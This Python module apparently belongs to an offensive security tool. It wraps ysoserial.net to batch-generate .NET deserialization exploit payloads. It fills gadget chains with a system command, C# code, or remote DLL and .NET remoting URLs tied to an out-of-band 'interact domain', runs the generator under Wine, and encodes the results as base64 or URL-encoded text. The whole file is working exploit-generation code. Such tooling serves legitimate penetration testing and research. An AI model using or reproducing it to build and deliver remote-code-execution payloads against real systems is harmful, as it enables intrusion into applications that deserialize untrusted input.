import re
import logging
import urllib.parse
import os
import base64
from .serializer import Serializer

class YSOSerialNet(Serializer):

    usage = 'ysoserial.net'

    specialPayloadFormats = {
        #'ActivitySurrogateDisableTypeCheck': 'Unhandled Exception: System.Runtime.Serialization.SerializationException: Soap Serializer does not support serializing Generic Types : System.Collections.Generic.SortedSet`1[System.String].',
        'ActivitySurrogateSelectorFromFile': '<local_file>',
        'BaseActivationFactory': '<remote_url>',
        'DataSetOldBehaviourFromFile': '<local_file>',
        'GetterCompilerResults': '<remote_url>',
        'ObjRef': '<net_remoting_url>',
        #'PSObject': 'Unhandled Exception: System.IO.FileNotFoundException: Could not load file or assembly System.Management.Automation, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35 or one of its dependencies. File not found ',
        'XamlAssemblyLoadFromFile': '<local_file>',
    }

    binaryFormatters = ['BinaryFormatter', 'MessagePackTypeless', 'MessagePackTypelessLz4', 'SharpSerializerBinary']

    def __init__(self, winePath, exePath, chainOpts):
        self.winePath = winePath
        self.exePath = exePath
        self.ysoserialNetOpts = chainOpts.ysoserial_net_options
        if os.name == 'nt':
            bin = f"{exePath}"
        else:
            bin = f"{winePath} {exePath}"
        super().__init__(bin, chainOpts)

    def exists(self):

        if os.name != 'nt':
            logging.debug("Checking wine binary for linux os")
            binBackup = self.bin
            self.bin = self.winePath
            wineOut = self.exec('--version 2>&1')
            self.bin = binBackup
            if not 'wine-' in wineOut:
                logging.error("wine binary not found or error:")
                logging.error(wineOut)
                return False
        
        return super().exists()

    
    def chains(self):
        chainsOutput = self.exec('').split('\n')
        chainPattern = r"^\s+\(\*\)\s(?P<name>[\w]+)"
        formattersPattern = r"^\s+Formatters:\s(?P<formatters>.+)$"
        chainRegex = re.compile(chainPattern)
        formattersRegex = re.compile(formattersPattern)
        chains = []
        chainsParsingStart = False
        chainParsingStart = False
        for line in chainsOutput:
            if '== GADGETS ==' in line:
                chainsParsingStart = True
                continue
            if '== PLUGINS ==' in line:
                chainsParsingStart = False
                break
            if not chainsParsingStart:
                continue

            if not chainParsingStart:
                match = chainRegex.search(line)
                if not match:
                    continue
                chainParsingStart = True
                chain = match.groupdict()
                chain = {
                    'id': chain['name'],
                    'name': chain['name'],
                    'formatters': []
                }
            else:
                chainParsingStart = False
                match = formattersRegex.search(line)
                if not match:
                    continue
                formatters = match.groupdict()
                for formatter in formatters['formatters'].split(' , '):
                    formatter = formatter.strip().split(' ')[0]
                    chain['formatters'].append(formatter)
                chain['description'] = f"{chain['name']}: {' | '.join(chain['formatters'])}"


                if chain['name'] in self.specialPayloadFormats:
                    chain['format'] = self.specialPayloadFormats[chain['name']]
                else:
                    chain['format'] = '<system_command>'
                chains.append(chain)
            
        return chains
    

    
    def payload(self, chainName, chainArgs):
        return self.exec(f"{self.ysoserialNetOpts} -g '{chainName}' {chainArgs}", rawResult=True)

    def generate(self, chains):

        if len(chains) == 0:
            return 0

        system_command = self.chainOpts.system_command
        interact_domain = self.chainOpts.interact_domain
        csharp_code = self.getFileContentOrCode(self.chainOpts.csharp_code)
        csharp_code_dlls = self.chainOpts.csharp_code_dlls
        formatters_filters = self.chainOpts.ysoserial_net_formatters.split(',') if self.chainOpts.ysoserial_net_formatters != None else None

        if '%%domain%%' in self.chainOpts.csharp_remote_dll and not interact_domain:
            logging.warning("%%domain%% in csharp remote DLL URL but no interact domain provided")
            csharp_remote_dll = None
        else:
            csharp_remote_dll = self.chainOpts.csharp_remote_dll.replace('%%domain%%', interact_domain)

        if '%%domain%%' in self.chainOpts.csharp_net_remoting and not interact_domain:
            logging.warning("%%domain%% in csharp .Net remoting URL but no interact domain provided")
            csharp_net_remoting = None
        else:
            csharp_net_remoting = self.chainOpts.csharp_net_remoting.replace('%%domain%%', interact_domain)
            

        logging.info(f"Interact domain: {interact_domain}")
        logging.info(f"System command: {system_command}")
        logging.info(f"CSharp Code: {self.chainOpts.csharp_code}")
        logging.info(f"DLL loaded remotely: {csharp_remote_dll}")
        logging.info(f".Net remoting URL: {csharp_net_remoting}")
        logging.info(f"Use only formatters: {formatters_filters}")

        # create an empty file that will contain C# code with the payload
        # create it in the current working directory, else wine won't see it
        fp = self.createTemporaryFile(suffix='.cs', dir=os.getcwd())
        if fp == None:
            return 0

        logging.info(f"Generating payloads...")
        
        # generate payload for each chain
        count = 0
        for chain in chains:

            for formatter in chain['formatters']:

                format = chain['format']

                if formatters_filters != None and formatter not in formatters_filters:
                    logging.debug(f"[{chain['name']}] Skipping formatter '{formatter}'")
                    continue

                if '<remote_url>' in format and not csharp_remote_dll:
                    logging.warning(f"[{chain['name']}] Skipping payload with formattter {formatter} because it requires a remote DLL URL")
                    continue
                if '<net_remoting_url>' in format and not csharp_remote_dll:
                    logging.warning(f"[{chain['name']}] Skipping payload with formattter {formatter} because it requires a .Net Remoting URL")
                    continue

                logging.info(f"[{chain['name']}] Generating payload with formatter '{formatter}'")


                chain_system_command = system_command
                chain_system_command = chain_system_command.replace('%%chain_id%%', chain['id'])
                chain_system_command = chain_system_command.replace('%%domain%%', str(interact_domain))
                escaped_chain_system_command = chain_system_command.replace('"', '\\"')
                chain_system_command = chain_system_command.replace("'", "\\'")
                

                chain_csharp_code = csharp_code
                chain_csharp_code = chain_csharp_code.replace('%%system_command%%', escaped_chain_system_command)
                chain_csharp_code = chain_csharp_code.replace('%%domain%%', str(interact_domain))
                chain_csharp_code = chain_csharp_code.replace('%%chain_id%%', chain['id'])

                chainArguments = format
                chainArguments = chainArguments.replace('<local_file>', os.path.basename(fp.name)+";"+csharp_code_dlls)
                chainArguments = chainArguments.replace('<system_command>', chain_system_command)
                chainArguments = chainArguments.replace('<domain>', str(interact_domain))
                chainArguments = chainArguments.replace('<remote_url>', str(csharp_remote_dll).replace('%%chain_id%%', chain['id']))
                chainArguments = chainArguments.replace('<net_remoting_url>', str(csharp_net_remoting).replace('%%chain_id%%', chain['id']))

                with open(fp.name, mode='w') as ft:
                    ft.write(chain_csharp_code)

                chainArguments = f"-f '{formatter}' -c '{chainArguments}' -o raw"
                result = self.payload(chain['name'], chainArguments)

                if result.returncode != 0:
                    logging.error(f"[{chain['name']}] Failed to create payload")
                    if result.stderr != b'':
                        logging.error(result.stderr.decode('ascii'))
                    if result.stdout != b'':
                        logging.error(result.stdout.decode('ascii'))
                    continue

                payload = result.stdout

                logging.debug(f"[{chain['name']}] Payload generated with {len(payload)} bytes")
                
                # binary formatters can be encoded
                if formatter in self.binaryFormatters:

                    if self.chainOpts.base64:
                        payload = base64.b64encode(payload)
                    elif self.chainOpts.base64_urlsafe:
                        payload = base64.urlsafe_b64encode(payload)
                    
                    if self.chainOpts.url:
                        payload = urllib.parse.quote_plus(payload).encode('ascii')
                else:
                    # clean string style formatters to have 1 payload per line
                    if not self.chainOpts.one_file_per_payload:
                        payload = payload.decode('ascii').replace('\r', '').replace('\n', '').encode('ascii')

                    if self.chainOpts.url:
                        payload = urllib.parse.quote_plus(payload).encode('ascii')
                
                self.output(f"{chain['id']}_{formatter}", payload+b"\n")
                count = count + 1
        
        # cleanup temp file
        if os.path.exists(fp.name):
            logging.debug(f"Removing temporary file {fp.name}")
            os.remove(fp.name)
                
        return count
